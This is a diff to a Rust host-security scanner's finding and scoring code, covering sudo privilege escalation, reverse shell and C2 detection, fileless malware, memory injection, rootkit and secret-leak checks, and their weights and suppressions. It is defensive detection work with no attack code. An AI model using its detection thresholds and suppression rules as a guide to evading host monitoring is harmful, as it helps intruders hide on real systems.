@@ -1,9 +1,5 @@
 use crate::coverage;
 use crate::models::{AgentReport, CronSeverity, InjectionClass, Origin, ProvenanceSource};
-/// Marker embedded in a NOPASSWD entry whose granted path is replaceable by an
-/// unprivileged user. Shared with `security.rs` so the policy has exactly one
-/// source of truth and cannot drift.
-const SUDO_PRIVESC_MARKER: &str = "[PRIVESC:";
 
 // ── Legacy constants (kept for backward compatibility) ─────
 
@@ -27,13 +23,28 @@ pub const RISK_CONTAINER_RESTART_LOOP: u8 = 5;
 pub const RISK_CONTAINER_UNHEALTHY: u8 = 10;
 pub const RESTART_LOOP_THRESHOLD: u64 = 3;
 
+/// Processes younger than this are treated as short-lived for DLP purposes.
+const DLP_SHORT_LIVED_AGE_SECS: u64 = 300;
+
 /// Bump whenever finding weights, tiers or IDs change: `compare` uses this to
 /// label a risk_score delta as a formula change, not a real drift.
 /// v8 (0.5.29): SEC-042 re-tiered into 042/049/050, SEC-046 gated by unit identity.
 /// v9 (0.5.30): SEC-051 added – ld.so.conf.d library path injection.
 /// v10 (0.5.31): SEC-052/053/054 systemd generators, one-way kernel switches as drift class.
 /// v11 (0.5.32): (PAM stack injection SEC‑055/056/057)
-pub const SCORING_VERSION: u8 = 11;
+/// v12 (0.5.35): SEC-005 now weights 15 for continuation-joined and
+///   Cmnd_Alias-resolved NOPASSWD: ALL (R26-08/R26-19); REL-002 no longer
+///   fires on hosts whose backup tool is configured but was previously
+///   undetectable under env_clear() (R26-03). Same host, different score.
+/// v13 (0.5.36): R27-16 extended `is_sensitive_key` with suffix rules, so
+/// SEC-014 now fires on hosts where it previously produced no finding.
+/// R27-25 splits self-attributed leaks out of SEC-014 into SEC-058 (weight 0),
+/// so a host whose only leak was the scanner's own environment now scores lower.
+/// Snapshot pairs spanning this version must be flagged as a collection-
+/// semantics change, not reported as real drift (R27-24).
+/// v14 (0.5.36): split short-lived secret leaks out of SEC-014 into SEC-059
+/// (weight 0), evidence now includes the age threshold.
+pub const SCORING_VERSION: u8 = 14;
 
 // ── Helper: keep evidence strings readable and JSON compact ─
 /// Truncate a list of items for display, appending "+N more" if beyond limit.
@@ -57,10 +68,41 @@ pub enum Category {
     Hygiene,
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Scanner {
+    Host,
+    Network,
+    Storage,
+    Security,
+    Persistence,
+    Packages,
+    Databases,
+    Docker,
+    /// Added by the orchestrator, not produced by a host scanner.
+    Orchestrator,
+}
+
+impl Scanner {
+    pub fn from_name(name: &str) -> Option<Self> {
+        match name {
+            "host" => Some(Self::Host),
+            "network" => Some(Self::Network),
+            "storage" => Some(Self::Storage),
+            "security" => Some(Self::Security),
+            "persistence" => Some(Self::Persistence),
+            "packages" => Some(Self::Packages),
+            "databases" => Some(Self::Databases),
+            "docker" => Some(Self::Docker),
+            _ => None,
+        }
+    }
+}
+
 #[derive(Debug, Clone)]
 #[allow(dead_code)]
 pub struct Finding {
     pub id: &'static str,
+    pub source: Scanner,
     pub title: String,
     pub category: Category,
     pub weight: u8,
@@ -86,7 +128,6 @@ pub(crate) fn unit_is_vendor_shipped(f: &crate::models::ExecStartFinding) -> boo
 /// Used by both SEC-044 (finding weight) and compare.rs (drift severity).
 pub(crate) fn core_pattern_is_trusted(cp: &str) -> bool {
     const KNOWN_HANDLERS: [&str; 3] = ["systemd-coredump", "abrt-hook-ccpp", "apport"];
-    // If it does not pipe to a handler, it is not a suspicious interceptor.
     let Some(handler) = cp.strip_prefix('|') else {
         return true;
     };
@@ -102,26 +143,32 @@ pub(crate) fn core_pattern_is_trusted(cp: &str) -> bool {
 /// including unknown/future caps — is treated as dangerous (fail-safe: a new
 /// dangerous cap must never be silently suppressed). Bit positions per <linux/capability.h>.
 fn ambient_escalation_weight(ambient: u64) -> u8 {
-    // Non-escalation caps, safe to hold ambiently.
-    const BENIGN: u64 = (1 << 10)   // CAP_NET_BIND_SERVICE (bind <1024)
-        | (1 << 14)   // CAP_IPC_LOCK   (mlock / large pages — DB memlock)
-        | (1 << 15)   // CAP_IPC_OWNER
-        | (1 << 23)   // CAP_SYS_NICE
-        | (1 << 25)   // CAP_SYS_TIME   (set clock)
-        | (1 << 35); // CAP_WAKE_ALARM
-    const MODERATE: u64 = 1 << 13; // CAP_NET_RAW
+    const BENIGN: u64 = (1 << 10) | (1 << 14) | (1 << 15) | (1 << 23) | (1 << 25) | (1 << 35);
+    const MODERATE: u64 = 1 << 13;
 
     if ambient & !BENIGN & !MODERATE != 0 {
-        12 // at least one escalation-primitive cap
+        12
     } else if ambient & MODERATE != 0 {
-        5 // NET_RAW only
+        5
     } else {
-        0 // benign caps only
+        0
     }
 }
 
+/// True when `f.source` matches a failed scanner name. Findings from failed
+/// scanners must not influence the score or exit code (R24-92, R25-27).
+fn finding_from_failed_scanner(f: &Finding, report: &AgentReport) -> bool {
+    report
+        .failed_scanners
+        .iter()
+        .any(|name| Scanner::from_name(name) == Some(f.source))
+}
+
 /// Evaluate a full agent report into a list of findings.
-/// This is a pure function – no side effects.
+/// This is a pure function – no side effects. Coverage warnings about
+/// unknown scanner names are emitted by `warn_unmapped_scanners`, and
+/// other coverage side effects by `warn_evaluate_side_effects`, both once
+/// per report (R25-59/R25-95).
 pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     let mut findings = Vec::new();
 
@@ -130,6 +177,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if !report.network.firewall_active {
         findings.push(Finding {
             id: "SEC-001",
+            source: Scanner::Network,
             title: "Firewall inactive".to_string(),
             category: Category::Security,
             weight: RISK_NO_FIREWALL,
@@ -139,7 +187,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SSH root login – differentiate prohibit-password
     if report.security.ssh_root_login_enabled {
         let detail = report
             .security
@@ -147,12 +194,13 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .as_deref()
             .unwrap_or("");
         let weight = if detail.eq_ignore_ascii_case("prohibit-password") {
-            RISK_SSH_ROOT_LOGIN / 2 // ~12
+            RISK_SSH_ROOT_LOGIN / 2
         } else {
-            RISK_SSH_ROOT_LOGIN // 25
+            RISK_SSH_ROOT_LOGIN
         };
         findings.push(Finding {
             id: "SEC-002",
+            source: Scanner::Security,
             title: "SSH root login allowed".to_string(),
             category: Category::Security,
             weight,
@@ -162,7 +210,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // Security updates – stepped weights
     if report.packages.upgradable.iter().any(|p| p.is_security) {
         let count = report
             .packages
@@ -171,7 +218,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .filter(|p| p.is_security)
             .count();
         let weight = if count > 20 {
-            RISK_SECURITY_UPDATES // 20
+            RISK_SECURITY_UPDATES
         } else if count > 5 {
             15
         } else {
@@ -179,6 +226,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         };
         findings.push(Finding {
             id: "SEC-003",
+            source: Scanner::Packages,
             title: "Pending security updates".to_string(),
             category: Category::Security,
             weight,
@@ -196,6 +244,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     {
         findings.push(Finding {
             id: "SEC-004",
+            source: Scanner::Network,
             title: "SSL certificate expiring".to_string(),
             category: Category::Security,
             weight: RISK_CRITICAL_SSL_MAX,
@@ -205,17 +254,16 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // Sudo NOPASSWD – distinguish ALL vs restricted, including replaceable paths
     if !report.security.sudo_nopasswd_entries.is_empty() {
         let has_all = report.security.sudo_nopasswd_entries.iter().any(|entry| {
-            let lower = entry.to_lowercase();
-            lower.contains("nopasswd: all")
-                || lower.ends_with("nopasswd:all")
-                || entry.contains(SUDO_PRIVESC_MARKER)
+            // R26-19: scanner already resolved aliases; do not re-parse.
+            entry.contains(crate::models::SUDO_ALL_MARKER)
+                || entry.contains(crate::models::SUDO_PRIVESC_MARKER)
         });
         let weight = if has_all { 15 } else { 5 };
         findings.push(Finding {
             id: "SEC-005",
+            source: Scanner::Security,
             title: "Sudo NOPASSWD entries found".to_string(),
             category: Category::Security,
             weight,
@@ -233,6 +281,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     {
         findings.push(Finding {
             id: "SEC-006",
+            source: Scanner::Security,
             title: "Sudoers permissions not 0440".to_string(),
             category: Category::Security,
             weight: RISK_SUDOERS_MODE,
@@ -242,7 +291,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // Sysctl issues – handle ip_forward with context
     for issue in &report.security.sysctl_issues {
         if issue.starts_with("net.ipv4.ip_forward=") {
             let suppressed = if report.topology.runtime_active
@@ -254,6 +302,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             };
             findings.push(Finding {
                 id: "SEC-007",
+                source: Scanner::Security,
                 title: "IP forwarding enabled".to_string(),
                 category: Category::Security,
                 weight: RISK_SYSCTL_PER_ISSUE,
@@ -276,6 +325,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             };
             findings.push(Finding {
                 id: "SEC-007",
+                source: Scanner::Security,
                 title,
                 category: Category::Security,
                 weight: RISK_SYSCTL_PER_ISSUE,
@@ -286,10 +336,10 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // SSH password authentication
     if report.security.ssh_password_auth_enabled {
         findings.push(Finding {
             id: "SEC-008",
+            source: Scanner::Security,
             title: "SSH password authentication enabled".to_string(),
             category: Category::Security,
             weight: RISK_SSH_PASSWORD_AUTH,
@@ -299,10 +349,10 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // Combo penalty: root login + password auth
     if report.security.ssh_password_auth_enabled && report.security.ssh_root_login_enabled {
         findings.push(Finding {
             id: "SEC-009",
+            source: Scanner::Security,
             title: "Root login with password allowed".to_string(),
             category: Category::Security,
             weight: 5,
@@ -312,7 +362,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── IAM & Access Alignment ───────────────────────────────
     let noncompliant_keys = report
         .security
         .access_alignment
@@ -323,6 +372,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if noncompliant_keys > 0 {
         findings.push(Finding {
             id: "SEC-011",
+            source: Scanner::Security,
             title: "SSH keys violate key-strength policy".to_string(),
             category: Category::Security,
             weight: 10,
@@ -342,6 +392,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     {
         findings.push(Finding {
             id: "SEC-012",
+            source: Scanner::Security,
             title: "Passwordless sudo to ALL commands".to_string(),
             category: Category::Security,
             weight: 15,
@@ -354,12 +405,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── Shadow IT & Suspicious Listeners — tiered by exposure × provenance ──
     let tiers = crate::utils::classify_listeners(&report.network.listening_ports);
 
     if !tiers.suspicious.is_empty() {
         findings.push(Finding {
             id: "SEC-013",
+            source: Scanner::Network,
             title: "Suspicious process listening on network port (Shadow IT)".to_string(),
             category: Category::Security,
             weight: 20,
@@ -376,6 +427,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if !tiers.devtool.is_empty() {
         findings.push(Finding {
             id: "SEC-030",
+            source: Scanner::Network,
             title: "Developer tool listening on loopback (IPC) — informational".to_string(),
             category: Category::Security,
             weight: 0,
@@ -394,6 +446,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if !tiers.provisional.is_empty() {
         findings.push(Finding {
             id: "SEC-031",
+            source: Scanner::Network,
             title: "User-space tool listening on loopback (IPC) — PROVISIONAL".to_string(),
             category: Category::Security,
             weight: 0,
@@ -409,7 +462,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-015 — IoC: privileged non-root implant reachable on the network ──
     {
         let mut ioc_evidence: Vec<String> = Vec::new();
         for port in &report.network.listening_ports {
@@ -447,6 +499,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         if !ioc_evidence.is_empty() {
             findings.push(Finding {
                 id: "SEC-015",
+                source: Scanner::Security,
                 title: "ACTIVE COMPROMISE: privileged non-root process on ephemeral path listening on network"
                     .to_string(),
                 category: Category::Security,
@@ -462,7 +515,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-016 — known malware/miner processes (name-recognized subset) ──
     let name_hits: Vec<&crate::models::SuspiciousProcess> = report
         .security
         .suspicious_processes
@@ -482,6 +534,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join(", ");
         findings.push(Finding {
             id: "SEC-016",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: known malicious process detected".to_string(),
             category: Category::Security,
             weight: 60,
@@ -491,11 +544,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-017 — fileless malware executing from an ephemeral path ──
-    // Self-attributed records are partitioned out BEFORE the aggregate is built.
-    // This Finding covers many PIDs, so `suppressed` on the Finding itself would
-    // mute foreign implants too — and since unlink-on-exec puts us in this list
-    // on every scan, it would mute SEC-017 permanently. Element-level only.
     let (fileless_self, fileless): (Vec<&crate::models::SuspiciousProcess>, Vec<_>) = report
         .security
         .suspicious_processes
@@ -520,6 +568,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join(", ");
         findings.push(Finding {
             id: "SEC-017",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: fileless malware executing from ephemeral path".to_string(),
             category: Category::Security,
             weight: 60,
@@ -529,7 +578,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-032 — scanner's own footprint, attributed and inert ──
     if !fileless_self.is_empty() {
         let list = fileless_self
             .iter()
@@ -541,6 +589,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join("; ");
         findings.push(Finding {
             id: "SEC-032",
+            source: Scanner::Security,
             title: "Scanner self-image: ephemeral privileged execution (attributed)".to_string(),
             category: Category::Security,
             weight: 0,
@@ -561,7 +610,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-019 — fileless implant that also holds critical kernel caps ──
     let mut fileless_priv: Vec<String> = Vec::new();
     for p in report
         .security
@@ -569,8 +617,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         .iter()
         .filter(|p| p.is_deleted)
     {
-        // Already documented by SEC-032; folding it in here would re-introduce
-        // the aggregate-suppression trap on a second finding id.
         if p.self_attributed.is_some() {
             continue;
         }
@@ -603,6 +649,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     if !fileless_priv.is_empty() {
         findings.push(Finding {
             id: "SEC-019",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: fileless malware holds critical kernel capabilities"
                 .to_string(),
             category: Category::Security,
@@ -617,7 +664,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-020 — process masquerading as a kernel thread ──
     let mimics: Vec<&crate::models::SuspiciousProcess> = report
         .security
         .suspicious_processes
@@ -638,6 +684,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join("; ");
         findings.push(Finding {
             id: "SEC-020",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: process masquerading as kernel thread".to_string(),
             category: Category::Security,
             weight: 60,
@@ -647,7 +694,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-021 – Bind-mount / overlay masking detected ──────
     if !report.security.mount_masking.is_empty() {
         let list = report
             .security
@@ -658,6 +704,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join("; ");
         findings.push(Finding {
             id: "SEC-021",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: Bind-mount masking detected".to_string(),
             category: Category::Security,
             weight: 60,
@@ -671,7 +718,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-022 – Reverse shell / C2 connection detected ─────
     if !report.security.reverse_shells.is_empty() {
         let list = report
             .security
@@ -690,6 +736,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join("; ");
         findings.push(Finding {
             id: "SEC-022",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: Reverse shell / C2 connection detected".to_string(),
             category: Category::Security,
             weight: 60,
@@ -703,7 +750,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-023, SEC-026, SEC-027, SEC-028, SEC-029 – Memory Forensics ──
     const DEEP_ESCALATE_MIN: u8 = 60;
     const DEEP_DEMOTE_MIN: u8 = 70;
 
@@ -723,14 +769,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     }
 
     fn reputable_exe(f: &crate::models::LibraryInjectionFinding) -> bool {
-        // Strong signal: already verified by cache or explicitly tagged
         if f.source.contains("cached-clean")
             || f.source.contains("provisional")
             || f.source.contains("allowlist")
         {
             return true;
         }
-        // Strong signal: path-based provenance (not the failable process name)
         if let Some(exe_path) = f.exe_path.as_deref() {
             let prov = crate::utils::exe_provenance(exe_path, f.pid);
             if matches!(
@@ -744,9 +788,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         false
     }
 
-    /// WEAK label, not trust: comm is spoofable (PR_SET_NAME). Last-chance tie-breaker
-    /// for VISIBLE provisional, ONLY when exe_path is unavailable and content/behavior
-    /// checks have already passed. Declarative: one name = one line.
     const KNOWN_RUNTIME_COMMS: &[&str] = &[
         "php-fpm",
         "php",
@@ -795,14 +836,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     fn mem_bucket(f: &crate::models::LibraryInjectionFinding, report: &AgentReport) -> MemBucket {
         let deep = f.deep_forensics.as_ref();
 
-        // Layer 1 — trumping malice overrides everything.
         if let Some(d) = deep
             && is_trumping_malice(d)
         {
             return MemBucket::DeepCritical;
         }
 
-        // Layer 2 — confident Origin attribution.
         if let Some(d) = deep {
             match d.origin {
                 Origin::UnknownPayload if d.confidence >= DEEP_ESCALATE_MIN => {
@@ -831,31 +870,23 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             }
         }
 
-        // Layer 2b — unlink-on-load ghost inode. Sixth Gate now supplies a content verdict.
         if f.source == "maps-so-unlink-on-load" {
             return match deep {
                 Some(d) => match d.origin {
-                    // Recovered a well-formed, low-entropy image → real extract.
                     Origin::GhostCleanImage if d.confidence >= DEEP_DEMOTE_MIN => {
                         MemBucket::Advisory
                     }
-                    // Recovered payload failed ELF sanity / entropy ceiling → live IoC.
                     Origin::GhostSuspectImage if d.confidence >= DEEP_ESCALATE_MIN => {
                         MemBucket::DeepCritical
                     }
-                    // Read succeeded but inconclusive (mid-band / truncated): stay visible.
                     Origin::GhostInconclusive => MemBucket::UnlinkGhost,
-                    // Legacy in-memory benign text shape, if some other path populated it.
                     _ if is_benign_shape(d) => MemBucket::Advisory,
                     _ => MemBucket::UnlinkGhost,
                 },
-                // map_files unreadable (EACCES/ENOENT): unchanged — stay SEC-033.
                 None => MemBucket::UnlinkGhost,
             };
         }
 
-        // Layer 3 — provisional trust (install-tree, cache-unverified, allowlisted, or
-        // unverified JNI .so extract).
         if f.source == "maps-rwx-provisional"
             || f.source == "maps-rwx-runtime-allowlist"
             || f.source == "maps-rwx-cached-clean"
@@ -867,7 +898,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             };
         }
 
-        // Layer 4 — structural class.
         match f.classify() {
             InjectionClass::ClassicInjection => MemBucket::Classic,
             InjectionClass::MemoryAnomaly => MemBucket::Anomaly,
@@ -875,10 +905,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    /// A single non-writable anonymous exec page is a trampoline/thunk slot
-    /// (libffi closures, PLT stubs), not a payload: 4 KiB is the mmap granule, and
-    /// r-x without w means the mapping already went through a W→X transition, which
-    /// is disciplined-JIT behaviour. Route to provisional instead of weighting it.
     const TRAMPOLINE_MAX_BYTES: u64 = 4096;
 
     fn is_trampoline_page(f: &crate::models::LibraryInjectionFinding) -> bool {
@@ -901,7 +927,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
     let mut deep_critical = Vec::new();
     let mut memory_anomalies = Vec::new();
     let mut jit_advisories = Vec::new();
-    let mut provisional_regions = Vec::new(); // formerly trusted_unverified, now includes trampolines
+    let mut provisional_regions = Vec::new();
     let mut unlink_ghosts = Vec::new();
 
     for finding in &report.security.library_injections {
@@ -910,7 +936,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             MemBucket::DeepCritical => deep_critical.push(finding),
             MemBucket::Anomaly => {
                 if is_trampoline_page(finding) {
-                    provisional_regions.push(finding); // trampoline → informational
+                    provisional_regions.push(finding);
                 } else {
                     memory_anomalies.push(finding);
                 }
@@ -921,7 +947,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // SEC-023 – Classic injections
     if !classic_injections.is_empty() {
         let list = classic_injections
             .iter()
@@ -937,6 +962,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-023",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: Userspace rootkit or code injection detected".to_string(),
             category: Category::Security,
             weight: 60,
@@ -946,7 +972,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SEC-028 – Deep Critical
     if !deep_critical.is_empty() {
         let list = deep_critical
             .iter()
@@ -969,6 +994,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-028",
+            source: Scanner::Security,
             title: "ACTIVE COMPROMISE: unattributed executable payload in memory".to_string(),
             category: Category::Security,
             weight: 60,
@@ -978,7 +1004,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SEC-026 – Memory anomalies (now excludes trampoline pages)
     if !memory_anomalies.is_empty() {
         let mut by_process: std::collections::HashMap<String, (usize, Option<String>)> =
             std::collections::HashMap::new();
@@ -1011,6 +1036,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-026",
+            source: Scanner::Security,
             title: "Suspicious executable memory mapping (anon/rwx/stack/heap)".to_string(),
             category: Category::Security,
             weight,
@@ -1024,7 +1050,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SEC-029 – Provisional trust (includes trampolines, trusted unverified, etc.)
     if !provisional_regions.is_empty() {
         let mut by_proc = std::collections::HashMap::new();
         for f in &provisional_regions {
@@ -1040,6 +1065,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
 
         findings.push(Finding {
             id: "SEC-029",
+            source: Scanner::Security,
             title: "Provisional memory regions (trampolines, unverified, etc.)".to_string(),
             category: Category::Security,
             weight: 0,
@@ -1057,7 +1083,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // SEC-033 – Unlink-on-load ghost inode (deleted jar-extract, provisional)
     if !unlink_ghosts.is_empty() {
         let list = unlink_ghosts
             .iter()
@@ -1072,6 +1097,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             .join("; ");
         findings.push(Finding {
             id: "SEC-033",
+            source: Scanner::Security,
             title: "Deleted temp-extract .so — unlink-on-load pattern (UNVERIFIED ghost inode)"
                 .to_string(),
             category: Category::Security,
@@ -1095,7 +1121,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-034 / SEC-036 – File capabilities inventory with risk-tiering ─
     let file_cap_findings = &report.security.file_capabilities;
     if !file_cap_findings.is_empty() {
         let mut suppressed_caps = Vec::new();
@@ -1110,7 +1135,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             }
         }
 
-        // Suppressed (expected) – informational
         if !suppressed_caps.is_empty() {
             let list = suppressed_caps
                 .iter()
@@ -1121,6 +1145,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-034",
+                source: Scanner::Security,
                 title: "Files with capabilities (setcap) – expected".to_string(),
                 category: Category::Security,
                 weight: 0,
@@ -1137,7 +1162,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Active (unexpected / suspicious) – visible, weighted
         if !active_caps.is_empty() {
             let max_weight = active_caps.iter().map(|(_, w, _)| *w).max().unwrap_or(0);
             let list = active_caps
@@ -1155,6 +1179,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-036",
+                source: Scanner::Security,
                 title: "Unexpected file capabilities (setcap) – review required".to_string(),
                 category: Category::Security,
                 weight: max_weight,
@@ -1169,7 +1194,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-037 – Setuid/setgid files inventory with risk-tiering ─────────
     let setuid_files = &report.security.setuid_files;
     if !setuid_files.is_empty() {
         let mut suppressed_su = Vec::new();
@@ -1184,7 +1208,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             }
         }
 
-        // Suppressed (expected) – informational
         if !suppressed_su.is_empty() {
             let list = suppressed_su
                 .iter()
@@ -1198,6 +1221,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-037",
+                source: Scanner::Security,
                 title: "Setuid/setgid files – expected".to_string(),
                 category: Category::Security,
                 weight: 0,
@@ -1214,7 +1238,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // Active (unexpected / suspicious) – visible, weighted
         if !active_su.is_empty() {
             let max_weight = active_su.iter().map(|(_, w, _)| *w).max().unwrap_or(0);
             let list = active_su
@@ -1229,6 +1252,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-037",
+                source: Scanner::Security,
                 title: "Unexpected setuid/setgid files – review required".to_string(),
                 category: Category::Security,
                 weight: max_weight,
@@ -1243,12 +1267,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // SEC‑035 – eBPF inventory (informational)
     let ebpf = &report.security.ebpf_inventory;
     let total = ebpf.programs.len() + ebpf.maps.len() + ebpf.links.len() + ebpf.pins.len();
     if total > 0 {
         findings.push(Finding {
             id: "SEC-035",
+            source: Scanner::Security,
             title: "eBPF programs, maps, links, and pins (informational)".to_string(),
             category: Category::Security,
             weight: 0,
@@ -1268,17 +1292,12 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         });
     }
 
-    // ── SEC-038 – Kernel taint tiered by module-integrity signal ───────────
-    // Unsigned/out-of-tree modules are ubiquitous on workstations & dev boxes
-    // (nvidia/dkms/vbox) → informational on their own. They become a weighted
-    // lead only when CORRELATED with an actually-hidden module (SEC-040), or as
-    // drift (compare.rs). Force-load/-unload/test-module are rare and weighted low.
     {
         let taint = &report.security.kernel_taint;
         let has = |c: char| taint.flags.iter().any(|f| f.code == c);
 
-        let forced = has('F') || has('R') || has('N'); // insmod -f / rmmod -f / test module
-        let unsigned_or_oot = has('E') || has('O'); // unsigned / out-of-tree
+        let forced = has('F') || has('R') || has('N');
+        let unsigned_or_oot = has('E') || has('O');
         let hidden = !report.security.kernel_modules.hidden_candidates.is_empty();
 
         let flags_str = taint
@@ -1303,6 +1322,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             };
             findings.push(Finding {
                 id: "SEC-038",
+                source: Scanner::Security,
                 title: "Kernel taint indicates module tampering".to_string(),
                 category: Category::Security,
                 weight,
@@ -1316,6 +1336,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         } else if unsigned_or_oot {
             findings.push(Finding {
                 id: "SEC-038",
+                source: Scanner::Security,
                 title: "Kernel tainted by unsigned/out-of-tree module (informational)".to_string(),
                 category: Category::Security,
                 weight: 0,
@@ -1331,14 +1352,13 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-039 – LSM confinement state ────────────────────────────────────
     {
         let c = &report.security.confinement;
 
-        // SELinux permissive is an unambiguous host-level downgrade → weighted.
         if c.selinux_permissive {
             findings.push(Finding {
                 id: "SEC-039",
+                source: Scanner::Security,
                 title: "SELinux running in permissive mode (not enforcing)".to_string(),
                 category: Category::Security,
                 weight: 15,
@@ -1350,11 +1370,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
             });
         }
 
-        // AppArmor complain mode is POINT-IN-TIME and cannot distinguish an
-        // intentional vendor baseline (e.g. BIND/named under a hosting panel whose
-        // stock profile is too strict) from a genuine enforce→complain regression.
-        // Informational here; the weighted signal is the enforce→complain DRIFT
-        // emitted by compare.rs.
         if !c.complain_profiles.is_empty() {
             let list = c
                 .complain_profiles
@@ -1364,6 +1379,7 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
                 .join("; ");
             findings.push(Finding {
                 id: "SEC-039",
+                source: Scanner::Security,
                 title: "AppArmor profiles in complain mode (informational)".to_string(),
                 category: Category::Security,
                 weight: 0,
@@ -1383,7 +1399,6 @@ pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
         }
     }
 
-    // ── SEC-040 – Hidden kernel module (Diamorphine-class LKM rootkit) ─────
     {
         let inv = &report.security.kernel_modules;
